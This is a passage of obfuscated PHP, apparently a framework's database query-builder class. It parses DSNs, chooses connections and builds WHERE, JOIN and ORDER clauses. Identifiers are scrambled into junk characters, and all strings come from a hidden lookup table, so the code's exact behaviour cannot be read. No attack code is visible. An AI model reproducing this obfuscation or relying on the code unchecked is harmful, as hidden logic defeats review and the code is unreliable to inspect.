{ think_exception(think_lang($E©à·–‘Øî[882]) . $E©à·–‘Øî[883] . $Fç©±§Å¢×); } goto A©­ğ³Àå; bôä•Û…©ğ: } public function __call($c÷¦ŠäŞÂ”, $aãø¯ŒŸËš) { if (method_exists($this, $c÷¦ŠäŞÂ”)) { return call_user_func_array(array($this, $c÷¦ŠäŞÂ”), $aãø¯ŒŸËš); } } protected function _getDsnType($d¨¿ÄĞè®Æ) { $Dáßæ÷œáŸ = explode($_SERVER[‡’¶øåüç˜][4], $d¨¿ÄĞè®Æ); $e‘ÀâŠÛ¹ã = strtoupper(trim($Dáßæ÷œáŸ[0])); return $e‘ÀâŠÛ¹ã; } private function parseConfig($Bî†¸ÁÖé = '') { $A×ğÓÕŸÍ„ =& $_SERVER[‡’¶øåüç˜]; if (!empty($Bî†¸ÁÖé) && is_string($Bî†¸ÁÖé)) { $Bî†¸ÁÖé = $this->parseDSN($Bî†¸ÁÖé); } elseif (is_array($Bî†¸ÁÖé)) { $Bî†¸ÁÖé = array_change_key_case($Bî†¸ÁÖé); $Bî†¸ÁÖé = array($A×ğÓÕŸÍ„[879] => $Bî†¸ÁÖé[$A×ğÓÕŸÍ„[728]], $A×ğÓÕŸÍ„[806] => $Bî†¸ÁÖé[$A×ğÓÕŸÍ„[884]], $A×ğÓÕŸÍ„[807] => $Bî†¸ÁÖé[$A×ğÓÕŸÍ„[885]], $A×ğÓÕŸÍ„[804] => $Bî†¸ÁÖé[$A×ğÓÕŸÍ„[886]], $A×ğÓÕŸÍ„[805] => $Bî†¸ÁÖé[$A×ğÓÕŸÍ„[887]], $A×ğÓÕŸÍ„[17] => $Bî†¸ÁÖé[$A×ğÓÕŸÍ„[888]], $A×ğÓÕŸÍ„[833] => $Bî†¸ÁÖé[$A×ğÓÕŸÍ„[730]], $A×ğÓÕŸÍ„[13] => isset($Bî†¸ÁÖé[$A×ğÓÕŸÍ„[889]]) ? $Bî†¸ÁÖé[$A×ğÓÕŸÍ„[889]] : array()); } elseif (empty($Bî†¸ÁÖé)) { if (think_config($A×ğÓÕŸÍ„[890]) && $A×ğÓÕŸÍ„[729] != strtolower(think_config($A×ğÓÕŸÍ„[891]))) { $Bî†¸ÁÖé = $this->parseDSN(think_config($A×ğÓÕŸÍ„[890])); } else { $Bî†¸ÁÖé = array($A×ğÓÕŸÍ„[879] => think_config($A×ğÓÕŸÍ„[891]), $A×ğÓÕŸÍ„[806] => think_config($A×ğÓÕŸÍ„[892]), $A×ğÓÕŸÍ„[807] => think_config($A×ğÓÕŸÍ„[893]), $A×ğÓÕŸÍ„[804] => think_config($A×ğÓÕŸÍ„[894]), $A×ğÓÕŸÍ„[805] => think_config($A×ğÓÕŸÍ„[895]), $A×ğÓÕŸÍ„[17] => think_config($A×ğÓÕŸÍ„[238]), $A×ğÓÕŸÍ„[833] => think_config($A×ğÓÕŸÍ„[890]), $A×ğÓÕŸÍ„[13] => think_config($A×ğÓÕŸÍ„[896])); } } return $Bî†¸ÁÖé; } protected function initConnect($c…í®²ïê³ = true) { if (1 == think_config($_SERVER[‡’¶øåüç˜][18])) { $this->_linkID = $this->multiConnect($c…í®²ïê³); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($eÊÜï²Ö±Ù = false) { $Eº³‡Õ— =& $_SERVER[‡’¶øåüç˜]; static $aÀ»’â¦Öâ = array(); if (empty($aÀ»’â¦Öâ)) { foreach ($this->config as $D‚…èáÙÊÊ => $BƒªÊÅôÊ¬) { $aÀ»’â¦Öâ[$D‚…èáÙÊÊ] = explode($Eº³‡Õ—[47], $BƒªÊÅôÊ¬); } } if (think_config($Eº³‡Õ—[897])) { if ($eÊÜï²Ö±Ù) { $bƒ¡×ÀíÂµ = floor(mt_rand(0, think_config($Eº³‡Õ—[898]) - 1)); } else { if (is_numeric(think_config($Eº³‡Õ—[899]))) { $bƒ¡×ÀíÂµ = think_config($Eº³‡Õ—[899]); } else { $bƒ¡×ÀíÂµ = floor(mt_rand(think_config($Eº³‡Õ—[898]), count($aÀ»’â¦Öâ[$Eº³‡Õ—[804]]) - 1)); } } } else { $bƒ¡×ÀíÂµ = floor(mt_rand(0, count($aÀ»’â¦Öâ[$Eº³‡Õ—[804]]) - 1)); } $dèÀ²Ëä°» = array($Eº³‡Õ—[806] => isset($aÀ»’â¦Öâ[$Eº³‡Õ—[806]][$bƒ¡×ÀíÂµ]) ? $aÀ»’â¦Öâ[$Eº³‡Õ—[806]][$bƒ¡×ÀíÂµ] : $aÀ»’â¦Öâ[$Eº³‡Õ—[806]][0], $Eº³‡Õ—[807] => isset($aÀ»’â¦Öâ[$Eº³‡Õ—[807]][$bƒ¡×ÀíÂµ]) ? $aÀ»’â¦Öâ[$Eº³‡Õ—[807]][$bƒ¡×ÀíÂµ] : $aÀ»’â¦Öâ[$Eº³‡Õ—[807]][0], $Eº³‡Õ—[804] => isset($aÀ»’â¦Öâ[$Eº³‡Õ—[804]][$bƒ¡×ÀíÂµ]) ? $aÀ»’â¦Öâ[$Eº³‡Õ—[804]][$bƒ¡×ÀíÂµ] : $aÀ»’â¦Öâ[$Eº³‡Õ—[804]][0], $Eº³‡Õ—[805] => isset($aÀ»’â¦Öâ[$Eº³‡Õ—[805]][$bƒ¡×ÀíÂµ]) ? $aÀ»’â¦Öâ[$Eº³‡Õ—[805]][$bƒ¡×ÀíÂµ] : $aÀ»’â¦Öâ[$Eº³‡Õ—[805]][0], $Eº³‡Õ—[17] => isset($aÀ»’â¦Öâ[$Eº³‡Õ—[17]][$bƒ¡×ÀíÂµ]) ? $aÀ»’â¦Öâ[$Eº³‡Õ—[17]][$bƒ¡×ÀíÂµ] : $aÀ»’â¦Öâ[$Eº³‡Õ—[17]][0], $Eº³‡Õ—[833] => isset($aÀ»’â¦Öâ[$Eº³‡Õ—[833]][$bƒ¡×ÀíÂµ]) ? $aÀ»’â¦Öâ[$Eº³‡Õ—[833]][$bƒ¡×ÀíÂµ] : $aÀ»’â¦Öâ[$Eº³‡Õ—[833]][0], $Eº³‡Õ—[13] => isset($aÀ»’â¦Öâ[$Eº³‡Õ—[13]][$bƒ¡×ÀíÂµ]) ? $aÀ»’â¦Öâ[$Eº³‡Õ—[13]][$bƒ¡×ÀíÂµ] : $aÀ»’â¦Öâ[$Eº³‡Õ—[13]][0]); return $this->connect($dèÀ²Ëä°», $bƒ¡×ÀíÂµ); } public function parseDSN($c·¤¼ÊğšÔ) { $DéÚîŠ¼ê¹ =& $_SERVER[‡’¶øåüç˜]; if (empty($c·¤¼ÊğšÔ)) { return !1; } $e­„Û‰Öå­ = parse_url($c·¤¼ÊğšÔ); if ($e­„Û‰Öå­[$DéÚîŠ¼ê¹[172]]) { $Câœ£Š…³´ = array($DéÚîŠ¼ê¹[879] => $e­„Û‰Öå­[$DéÚîŠ¼ê¹[172]], $DéÚîŠ¼ê¹[806] => isset($e­„Û‰Öå­[$DéÚîŠ¼ê¹[547]]) ? $e­„Û‰Öå­[$DéÚîŠ¼ê¹[547]] : $DéÚîŠ¼ê¹[33], $DéÚîŠ¼ê¹[807] => isset($e­„Û‰Öå­[$DéÚîŠ¼ê¹[900]]) ? $e­„Û‰Öå­[$DéÚîŠ¼ê¹[900]] : $DéÚîŠ¼ê¹[33], $DéÚîŠ¼ê¹[804] => isset($e­„Û‰Öå­[$DéÚîŠ¼ê¹[173]]) ? $e­„Û‰Öå­[$DéÚîŠ¼ê¹[173]] : $DéÚîŠ¼ê¹[33], $DéÚîŠ¼ê¹[805] => isset($e­„Û‰Öå­[$DéÚîŠ¼ê¹[174]]) ? $e­„Û‰Öå­[$DéÚîŠ¼ê¹[174]] : $DéÚîŠ¼ê¹[33], $DéÚîŠ¼ê¹[17] => isset($e­„Û‰Öå­[$DéÚîŠ¼ê¹[75]]) ? substr($e­„Û‰Öå­[$DéÚîŠ¼ê¹[75]], 1) : $DéÚîŠ¼ê¹[33]); } else { preg_match($DéÚîŠ¼ê¹[901], trim($c·¤¼ÊğšÔ), $FËœÇ‘„ù); $Câœ£Š…³´ = array($DéÚîŠ¼ê¹[879] => $FËœÇ‘„ù[1], $DéÚîŠ¼ê¹[806] => $FËœÇ‘„ù[2], $DéÚîŠ¼ê¹[807] => $FËœÇ‘„ù[3], $DéÚîŠ¼ê¹[804] => $FËœÇ‘„ù[4], $DéÚîŠ¼ê¹[805] => $FËœÇ‘„ù[5], $DéÚîŠ¼ê¹[17] => $FËœÇ‘„ù[6]); } $Câœ£Š…³´[$DéÚîŠ¼ê¹[833]] = $DéÚîŠ¼ê¹[33]; return $Câœ£Š…³´; } protected function debug() { $e„ñœ„õˆ– =& $_SERVER[‡’¶øåüç˜]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $e„ñœ„õˆ–[902]; if (think_config($e„ñœ„õˆ–[903])) { think_status($e„ñœ„õˆ–[904]); think_trace($this->queryStr . $e„ñœ„õˆ–[905] . think_status($e„ñœ„õˆ–[20], $e„ñœ„õˆ–[904], 6) . $e„ñœ„õˆ–[906], $e„ñœ„õˆ–[33], $e„ñœ„õˆ–[907]); } } protected function parseLock($aÚÍŞåÌÅ„ = false) { $fíË¨ºçªº =& $_SERVER[‡’¶øåüç˜]; if (!$aÚÍŞåÌÅ„) { return $fíË¨ºçªº[33]; } if ($fíË¨ºçªº[835] == $this->dbType) { return $fíË¨ºçªº[908]; } return $fíË¨ºçªº[909]; } protected function parseSet($EÙ‹‡Åè‚‹) { $f¢µ •Œ§¬ =& $_SERVER[‡’¶øåüç˜]; foreach ($EÙ‹‡Åè‚‹ as $D î…‡Û‘Ì => $D†Åç‚ë¡Å) { if (is_array($D†Åç‚ë¡Å) && $f¢µ •Œ§¬[289] == $D†Åç‚ë¡Å[0]) { $f‰Ëõ¥êš©[] = $this->parseKey($D î…‡Û‘Ì) . $f¢µ •Œ§¬[910] . $D†Åç‚ë¡Å[1]; } elseif (is_scalar($D†Åç‚ë¡Å) || is_null($D†Åç‚ë¡Å)) { $f‰Ëõ¥êš©[] = $this->parseKey($D î…‡Û‘Ì) . $f¢µ •Œ§¬[910] . $this->parseValue($D†Åç‚ë¡Å); } } return $f¢µ •Œ§¬[911] . implode($f¢µ •Œ§¬[47], $f‰Ëõ¥êš©); } protected function bindParam($e–ùØîÂ›ô, $Bä¡Ğ§¤œ‘) { $this->bind[$_SERVER[‡’¶øåüç˜][4] . $e–ùØîÂ›ô] = $Bä¡Ğ§¤œ‘; } protected function parseBind($cèä±Ø‘Ü) { $cèä±Ø‘Ü = array_merge($this->bind, $cèä±Ø‘Ü); $this->bind = array(); return $cèä±Ø‘Ü; } function parseKey(&$eÜøÁöçÉ , $DŠ›¡óê»³ = true) { if ($DŠ›¡óê»³) { $eÜøÁöçÉ  = $this->parseKeyCheck($eÜøÁöçÉ ); } return $eÜøÁöçÉ ; } function parseKeyCheck($E—™¨éàƒ÷) { $f®¶ÊÅ·Èã =& $_SERVER[‡’¶øåüç˜]; $E—™¨éàƒ÷ = trim($E—™¨éàƒ÷); if (!preg_match($f®¶ÊÅ·Èã[912], $E—™¨éàƒ÷)) { think_exception($f®¶ÊÅ·Èã[913] . $E—™¨éàƒ÷); } return $E—™¨éàƒ÷; } protected function parseValue($f—î‡Ù¤Áƒ) { $f•ÙÃ‘íÕÌ =& $_SERVER[‡’¶øåüç˜]; if (is_string($f—î‡Ù¤Áƒ)) { $f—î‡Ù¤Áƒ = $f•ÙÃ‘íÕÌ[874] . $this->escapeString($f—î‡Ù¤Áƒ) . $f•ÙÃ‘íÕÌ[874]; } elseif (isset($f—î‡Ù¤Áƒ[0]) && is_string($f—î‡Ù¤Áƒ[0]) && strtolower($f—î‡Ù¤Áƒ[0]) == $f•ÙÃ‘íÕÌ[289]) { $f—î‡Ù¤Áƒ = $this->escapeString($f—î‡Ù¤Áƒ[1]); } elseif (is_array($f—î‡Ù¤Áƒ)) { $f—î‡Ù¤Áƒ = array_map(array($this, $f•ÙÃ‘íÕÌ[875]), $f—î‡Ù¤Áƒ); } elseif (is_bool($f—î‡Ù¤Áƒ)) { $f—î‡Ù¤Áƒ = $f—î‡Ù¤Áƒ ? $f•ÙÃ‘íÕÌ[83] : $f•ÙÃ‘íÕÌ[481]; } elseif (is_null($f—î‡Ù¤Áƒ)) { $f—î‡Ù¤Áƒ = $f•ÙÃ‘íÕÌ[99]; } return $f—î‡Ù¤Áƒ; } protected function parseField($eè„“…¶¦ã) { $f«‹Ú½‹è° =& $_SERVER[‡’¶øåüç˜]; if (is_string($eè„“…¶¦ã) && strpos($eè„“…¶¦ã, $f«‹Ú½‹è°[47])) { $eè„“…¶¦ã = explode($f«‹Ú½‹è°[47], $eè„“…¶¦ã); } if (is_array($eè„“…¶¦ã)) { $bÍ±×˜¦Õ‚ = array(); foreach ($eè„“…¶¦ã as $Fï·„Õ¾Ò§ => $eÏ÷²İ…Ö ) { if (!is_numeric($Fï·„Õ¾Ò§)) { $bÍ±×˜¦Õ‚[] = $this->parseKey($Fï·„Õ¾Ò§) . $f«‹Ú½‹è°[914] . $this->parseKey($eÏ÷²İ…Ö ); } else { $bÍ±×˜¦Õ‚[] = $this->parseKey($eÏ÷²İ…Ö ); } } $fÄŠ±ÚªÍÇ = implode($f«‹Ú½‹è°[47], $bÍ±×˜¦Õ‚); } elseif (is_string($eè„“…¶¦ã) && !empty($eè„“…¶¦ã)) { $fÄŠ±ÚªÍÇ = $eè„“…¶¦ã; } else { $fÄŠ±ÚªÍÇ = $f«‹Ú½‹è°[180]; } return $fÄŠ±ÚªÍÇ; } protected function parseTable($B‹ñ¬¡µÒ“) { $c÷Ø¶ø™³ =& $_SERVER[‡’¶øåüç˜]; if (is_array($B‹ñ¬¡µÒ“)) { $dàÀ÷½¤‰‡ = array(); foreach ($B‹ñ¬¡µÒ“ as $f…ù¯ò¥Î» => $eœßÇ‚¡´¨) { if (!is_numeric($f…ù¯ò¥Î»)) { $dàÀ÷½¤‰‡[] = $this->parseKey($f…ù¯ò¥Î») . $c÷Ø¶ø™³[50] . $this->parseKey($eœßÇ‚¡´¨); } else { $dàÀ÷½¤‰‡[] = $this->parseKey($f…ù¯ò¥Î»); } } $B‹ñ¬¡µÒ“ = $dàÀ÷½¤‰‡; } elseif (is_string($B‹ñ¬¡µÒ“)) { if (strstr($B‹ñ¬¡µÒ“, $c÷Ø¶ø™³[50])) { return $B‹ñ¬¡µÒ“; } $B‹ñ¬¡µÒ“ = explode($c÷Ø¶ø™³[47], $B‹ñ¬¡µÒ“); array_walk($B‹ñ¬¡µÒ“, array($this, $c÷Ø¶ø™³[823])); } return $c÷Ø¶ø™³[915] . trim(implode($c÷Ø¶ø™³[916], $B‹ñ¬¡µÒ“), $c÷Ø¶ø™³[829]) . $c÷Ø¶ø™³[915]; } protected function parseWhere($C–º¤ íƒ) { $C¦Ò©«ì†½ =& $_SERVER[‡’¶øåüç˜]; $B¡¯Ô’¼³ = $C¦Ò©«ì†½[33]; if (is_string($C–º¤ íƒ)) { $B¡¯Ô’¼³ = $C–º¤ íƒ; } else { $cÏ¦šºè„± = isset($C–º¤ íƒ[$C¦Ò©«ì†½[917]]) ? strtoupper($C–º¤ íƒ[$C¦Ò©«ì†½[917]]) : $C¦Ò©«ì†½[33]; if (in_array($cÏ¦šºè„±, array($C¦Ò©«ì†½[918], $C¦Ò©«ì†½[919], $C¦Ò©«ì†½[920]))) { $cÏ¦šºè„± = $C¦Ò©«ì†½[50] . $cÏ¦šºè„± . $C¦Ò©«ì†½[50]; unset($C–º¤ íƒ[$C¦Ò©«ì†½[917]]); } else { $cÏ¦šºè„± = $C¦Ò©«ì†½[921]; } foreach ($C–º¤ íƒ as $AñİÀ×ùÎŠ => $e÷«¼‘Ÿ£ç) { $B¡¯Ô’¼³ .= $C¦Ò©«ì†½[269]; if (is_numeric($AñİÀ×ùÎŠ)) { $AñİÀ×ùÎŠ = $C¦Ò©«ì†½[922]; } if (0 === strpos($AñİÀ×ùÎŠ, $C¦Ò©«ì†½[70])) { $B¡¯Ô’¼³ .= $this->parseThinkWhere($AñİÀ×ùÎŠ, $e÷«¼‘Ÿ£ç); } else { if (!preg_match($C¦Ò©«ì†½[923], trim($AñİÀ×ùÎŠ))) { think_exception(think_lang($C¦Ò©«ì†½[924]) . $C¦Ò©«ì†½[4] . $AñİÀ×ùÎŠ); } $fŒ´ƒ‹±âğ = is_array($e÷«¼‘Ÿ£ç) && isset($e÷«¼‘Ÿ£ç[$C¦Ò©«ì†½[925]]); $AñİÀ×ùÎŠ = trim($AñİÀ×ùÎŠ); if (strpos($AñİÀ×ùÎŠ, $C¦Ò©«ì†½[275])) { $Bö¢å¡Éâ¦ = explode($C¦Ò©«ì†½[275], $AñİÀ×ùÎŠ); $Bƒ•îå”Õ = array(); foreach ($Bö¢å¡Éâ¦ as $CÍ‹ç»™ => $DòœÎìÈ«À) { $cçŠ¿‘Ùëæ = $fŒ´ƒ‹±âğ ? $e÷«¼‘Ÿ£ç[$CÍ‹ç»™] : $e÷«¼‘Ÿ£ç; $Bƒ•îå”Õ[] = $C¦Ò©«ì†½[252] . $this->parseWhereItem($this->parseKey($DòœÎìÈ«À), $cçŠ¿‘Ùëæ) . $C¦Ò©«ì†½[822]; } $B¡¯Ô’¼³ .= implode($C¦Ò©«ì†½[926], $Bƒ•îå”Õ); } elseif (strpos($AñİÀ×ùÎŠ, $C¦Ò©«ì†½[276])) { $Bö¢å¡Éâ¦ = explode($C¦Ò©«ì†½[276], $AñİÀ×ùÎŠ); $Bƒ•îå”Õ = array(); foreach ($Bö¢å¡Éâ¦ as $CÍ‹ç»™ => $DòœÎìÈ«À) { $cçŠ¿‘Ùëæ = $fŒ´ƒ‹±âğ ? $e÷«¼‘Ÿ£ç[$CÍ‹ç»™] : $e÷«¼‘Ÿ£ç; $Bƒ•îå”Õ[] = $C¦Ò©«ì†½[252] . $this->parseWhereItem($this->parseKey($DòœÎìÈ«À), $cçŠ¿‘Ùëæ) . $C¦Ò©«ì†½[822]; } $B¡¯Ô’¼³ .= implode($C¦Ò©«ì†½[921], $Bƒ•îå”Õ); } else { $B¡¯Ô’¼³ .= $this->parseWhereItem($this->parseKey($AñİÀ×ùÎŠ), $e÷«¼‘Ÿ£ç); } } $B¡¯Ô’¼³ .= $C¦Ò©«ì†½[270] . $cÏ¦šºè„±; } $B¡¯Ô’¼³ = substr($B¡¯Ô’¼³, 0, -strlen($cÏ¦šºè„±)); } return empty($B¡¯Ô’¼³) ? $C¦Ò©«ì†½[33] : $C¦Ò©«ì†½[927] . $B¡¯Ô’¼³; } protected function parseWhereItem($cŠáÅÃÄä, $dĞèÉ²·) { $cµ¤áŠ‹ =& $_SERVER[‡’¶øåüç˜]; $F»‘âÉ†¯… = $cµ¤áŠ‹[33]; if (is_array($dĞèÉ²·)) { if (is_string($dĞèÉ²·[0])) { $E¼Òï½É„á = strtolower($dĞèÉ²·[0]); if (in_array($dĞèÉ²·[0], array($cµ¤áŠ‹[910], $cµ¤áŠ‹[928], $cµ¤áŠ‹[929], $cµ¤áŠ‹[930], $cµ¤áŠ‹[931], $cµ¤áŠ‹[932]))) { $F»‘âÉ†¯… .= $cŠáÅÃÄä . $cµ¤áŠ‹[50] . $dĞèÉ²·[0] . $cµ¤áŠ‹[50] . $this->parseValue($dĞèÉ²·[1]); } elseif (preg_match($cµ¤áŠ‹[933], $dĞèÉ²·[0])) { $F»‘âÉ†¯… .= $cŠáÅÃÄä . $cµ¤áŠ‹[50] . $this->exp[$E¼Òï½É„á] . $cµ¤áŠ‹[50] . $this->parseValue($dĞèÉ²·[1]); } elseif (preg_match($cµ¤áŠ‹[934], $dĞèÉ²·[0])) { if (is_array($dĞèÉ²·[1])) { $Fâì†ªÙÀô = isset($dĞèÉ²·[2]) ? strtoupper($dĞèÉ²·[2]) : $cµ¤áŠ‹[919]; if (in_array($Fâì†ªÙÀô, array($cµ¤áŠ‹[918], $cµ¤áŠ‹[919], $cµ¤áŠ‹[920]))) { $d¾‰øµŸ¸ = array(); foreach ($dĞèÉ²·[1] as $a‚¥¿Ùº³) { $d¾‰øµŸ¸[] = $cŠáÅÃÄä . $cµ¤áŠ‹[50] . $this->exp[$E¼Òï½É„á] . $cµ¤áŠ‹[50] . $this->parseValue($a‚¥¿Ùº³); } $F»‘âÉ†¯… .= $cµ¤áŠ‹[252] . implode($cµ¤áŠ‹[50] . $Fâì†ªÙÀô . $cµ¤áŠ‹[50], $d¾‰øµŸ¸) . $cµ¤áŠ‹[822]; } } else { $F»‘âÉ†¯… .= $cŠáÅÃÄä . $cµ¤áŠ‹[50] . $this->exp[$E¼Òï½É„á] . $cµ¤áŠ‹[50] . $this->parseValue($dĞèÉ²·[1]); } } elseif ($cµ¤áŠ‹[289] == $E¼Òï½É„á) { $F»‘âÉ†¯… .= $cµ¤áŠ‹[820] . $cŠáÅÃÄä . $cµ¤áŠ‹[50] . $dĞèÉ²·[1] . $cµ¤áŠ‹[935]; } elseif (preg_match($cµ¤áŠ‹[936], $dĞèÉ²·[0])) { if (isset($dĞèÉ²·[2]) && $cµ¤áŠ‹[289] == $dĞèÉ²·[2]) { $F»‘âÉ†¯… .= $cŠáÅÃÄä . $cµ¤áŠ‹[50] . $this->exp[$E¼Òï½É„á] . $cµ¤áŠ‹[50] . $dĞèÉ²·[1]; } else { if (is_string($dĞèÉ²·[1])) { $dĞèÉ²·[1] = explode($cµ¤áŠ‹[47], $dĞèÉ²·[1]); } $b†¯Ì¸Õí´ = implode($cµ¤áŠ‹[47], $this->parseValue($dĞèÉ²·[1])); $F»‘âÉ†¯… .= $cŠáÅÃÄä . $cµ¤áŠ‹[50] . $this->exp[$E¼Òï½É„á] . $cµ¤áŠ‹[820] . $b†¯Ì¸Õí´ . $cµ¤áŠ‹[822]; } } elseif (preg_match($cµ¤áŠ‹[937], $dĞèÉ²·[0])) { $A‘„Æˆ™Ûù = is_string($dĞèÉ²·[1]) ? explode($cµ¤áŠ‹[47], $dĞèÉ²·[1]) : $dĞèÉ²·[1]; $F»‘âÉ†¯… .= $cµ¤áŠ‹[820] . $cŠáÅÃÄä . $cµ¤áŠ‹[50] . $this->exp[$E¼Òï½É„á] . $cµ¤áŠ‹[50] . $this->parseValue($A‘„Æˆ™Ûù[0]) . $cµ¤áŠ‹[921] . $this->parseValue($A‘„Æˆ™Ûù[1]) . $cµ¤áŠ‹[270]; } else { think_exception(think_lang($cµ¤áŠ‹[924]) . $cµ¤áŠ‹[4] . $dĞèÉ²·[0]); } } else { $d†Ÿ¹ñáŞ² = count($dĞèÉ²·); $BÊ»­ÏÜ´é = isset($dĞèÉ²·[$d†Ÿ¹ñáŞ² - 1]) ? strtoupper($dĞèÉ²·[$d†Ÿ¹ñáŞ² - 1]) : $cµ¤áŠ‹[33]; if (in_array($BÊ»­ÏÜ´é, array($cµ¤áŠ‹[918], $cµ¤áŠ‹[919], $cµ¤áŠ‹[920]))) { $d†Ÿ¹ñáŞ² = $d†Ÿ¹ñáŞ² - 1; } else { $BÊ»­ÏÜ´é = $cµ¤áŠ‹[918]; } for ($f„Î·³ªñ = 0; $f„Î·³ªñ < $d†Ÿ¹ñáŞ²; $f„Î·³ªñ++) { $A‘„Æˆ™Ûù = is_array($dĞèÉ²·[$f„Î·³ªñ]) ? $dĞèÉ²·[$f„Î·³ªñ][1] : $dĞèÉ²·[$f„Î·³ªñ]; if ($cµ¤áŠ‹[289] == strtolower($dĞèÉ²·[$f„Î·³ªñ][0])) { $F»‘âÉ†¯… .= $cµ¤áŠ‹[252] . $cŠáÅÃÄä . $cµ¤áŠ‹[50] . $A‘„Æˆ™Ûù . $cµ¤áŠ‹[935] . $BÊ»­ÏÜ´é . $cµ¤áŠ‹[50]; } else { $Eõµ®Ö’ß = is_array($dĞèÉ²·[$f„Î·³ªñ]) ? $this->exp[strtolower($dĞèÉ²·[$f„Î·³ªñ][0])] : $cµ¤áŠ‹[910]; if (!$Eõµ®Ö’ß && is_array($dĞèÉ²·[$f„Î·³ªñ]) && in_array($dĞèÉ²·[$f„Î·³ªñ][0], array($cµ¤áŠ‹[910], $cµ¤áŠ‹[928], $cµ¤áŠ‹[929], $cµ¤áŠ‹[930], $cµ¤áŠ‹[931], $cµ¤áŠ‹[932]))) { $Eõµ®Ö’ß = $dĞèÉ²·[$f„Î·³ªñ][0]; } $F»‘âÉ†¯… .= $cµ¤áŠ‹[252] . $cŠáÅÃÄä . $cµ¤áŠ‹[50] . $Eõµ®Ö’ß . $cµ¤áŠ‹[50] . $this->parseValue($A‘„Æˆ™Ûù) . $cµ¤áŠ‹[935] . $BÊ»­ÏÜ´é . $cµ¤áŠ‹[50]; } } $F»‘âÉ†¯… = substr($F»‘âÉ†¯…, 0, -4); } } else { $F»‘âÉ†¯… .= $cŠáÅÃÄä . $cµ¤áŠ‹[938] . $this->parseValue($dĞèÉ²·); } return $F»‘âÉ†¯…; } protected function parseThinkWhere($Dš¥ÍØœÃ†, $F´´±³ÈÆ) { $EØÊÆ‹Û =& $_SERVER[‡’¶øåüç˜]; $C˜¡ó¨¥çÛ = $EØÊÆ‹Û[33]; switch ($Dš¥ÍØœÃ†) { case $EØÊÆ‹Û[343]: $C˜¡ó¨¥çÛ = $F´´±³ÈÆ; break; case $EØÊÆ‹Û[922]: $C˜¡ó¨¥çÛ = is_string($F´´±³ÈÆ) ? $F´´±³ÈÆ : substr($this->parseWhere($F´´±³ÈÆ), 6); break; case $EØÊÆ‹Û[939]: parse_str($F´´±³ÈÆ, $a’•ÈÛéÒ‹); if (isset($a’•ÈÛéÒ‹[$EØÊÆ‹Û[917]])) { $D’†ÚÇ£ = $EØÊÆ‹Û[50] . strtoupper($a’•ÈÛéÒ‹[$EØÊÆ‹Û[917]]) . $EØÊÆ‹Û[50]; unset($a’•ÈÛéÒ‹[$EØÊÆ‹Û[917]]); } else { $D’†ÚÇ£ = $EØÊÆ‹Û[921]; } $EĞ¯°İ‘¯ = array(); foreach ($a’•ÈÛéÒ‹ as $A‘´ê…‹ƒÒ => $eùõïÇêÆ) { $EĞ¯°İ‘¯[] = $this->parseKey($A‘´ê…‹ƒÒ) . $EØÊÆ‹Û[938] . $this->parseValue($eùõïÇêÆ); } $C˜¡ó¨¥çÛ = implode($D’†ÚÇ£, $EĞ¯°İ‘¯); break; } return $C˜¡ó¨¥çÛ; } protected function parseLimit($E¸ìÈ’”) { $EïÉçÜ†Ì =& $_SERVER[‡’¶øåüç˜]; return !empty($E¸ìÈ’”) ? $EïÉçÜ†Ì[48] . $E¸ìÈ’” . $EïÉçÜ†Ì[50] : $EïÉçÜ†Ì[33]; } protected function parseJoin($e­ºø·¥³) { $a½‰‚Ú¹ =& $_SERVER[‡’¶øåüç˜]; $bÛ±ğ‹Ïƒ = $a½‰‚Ú¹[33]; if (!empty($e­ºø·¥³)) { if (is_array($e­ºø·¥³)) { foreach ($e­ºø·¥³ as $A¢¯•¨…÷„ => $CÄõ—µˆÎ») { if (!1 !== stripos($CÄõ—µˆÎ», $a½‰‚Ú¹[940])) { $bÛ±ğ‹Ïƒ .= $a½‰‚Ú¹[50] . $CÄõ—µˆÎ»; } else { $bÛ±ğ‹Ïƒ .= $a½‰‚Ú¹[941] . $CÄõ—µˆÎ»; } } } else { $bÛ±ğ‹Ïƒ .= $a½‰‚Ú¹[941] . $e­ºø·¥³; } } $bÛ±ğ‹Ïƒ = preg_replace($a½‰‚Ú¹[942], think_config($a½‰‚Ú¹[847]) . $a½‰‚Ú¹[943], $bÛ±ğ‹Ïƒ); return $bÛ±ğ‹Ïƒ; } protected function parseOrder($C¼—ôã÷­) { $Aöõä¸º¡ =& $_SERVER[‡’¶øåüç˜]; if (is_array($C¼—ôã÷­)) { $B´âÚåá«® = array(); foreach ($C¼—ôã÷­ as $EÄ¥°Ï¿ê¦ => $bÉÆÜ‹Ó‚™) { if (is_numeric($EÄ¥°Ï¿ê¦)) { $B´âÚåá«®[] = $this->parseKey($bÉÆÜ‹Ó‚™); } else { $bÉÆÜ‹Ó‚™ = in_array(strtoupper(trim($bÉÆÜ‹Ó‚™)), array($Aöõä¸º¡[944], $Aöõä¸º¡[945])) ? $Aöõä¸º¡[50] . $bÉÆÜ‹Ó‚™ : $Aöõä¸º¡[33]; if (preg_match($Aöõä¸º¡[946], $EÄ¥°Ï¿ê¦)) { $B´âÚåá«®[] = $this->parseKey($EÄ¥°Ï¿ê¦) . $bÉÆÜ‹Ó‚™; } else { think_exception($Aöõä¸º¡[947] . $EÄ¥°Ï¿ê¦); } } } $C¼—ôã÷­ = implode($Aöõä¸º¡[47], $B´âÚåá«®); } return !empty($C¼—ôã÷­) ? $Aöõä¸º¡[948] . $C¼—ôã÷­ : $Aöõä¸º¡[33]; } protected function parseGroup($EˆäÒƒªŒ) { $A²¯®Ÿ£¼Ç =& $_SERVER[‡’¶øåüç˜]; return !empty($EˆäÒƒªŒ) ? $A²¯®Ÿ£¼Ç[949] . $EˆäÒƒªŒ : $A²¯®Ÿ£¼Ç[33]; } protected function parseHaving($d›ç÷¤¨îä) { $cª…øÕİ„ =& $_SERVER[‡’¶øåüç˜]; return !empty($d›ç÷¤¨îä) ? $cª…øÕİ„[950] . $d›ç÷¤¨îä : $cª…øÕİ„[33]; } protected function parseComment($D–èÑà’‹¶) { $f¬¶‚„›ÄÏ =& $_SERVER[‡’¶øåüç˜]; return !empty($D–èÑà’‹¶) ? $f¬¶‚„›ÄÏ[951] . $D–èÑà’‹¶ . $f¬¶‚„›ÄÏ[952] : $f¬¶‚„›ÄÏ[33]; } protected function parseDistinct($e¶Ì¨Àîê—) { $F–Â¨¶ñ¹ =& $_SERVER[‡’¶øåüç˜]; return !empty($e¶Ì¨Àîê—) ? $F–Â¨¶ñ¹[953] : $F–Â¨¶ñ¹[33]; } protected function 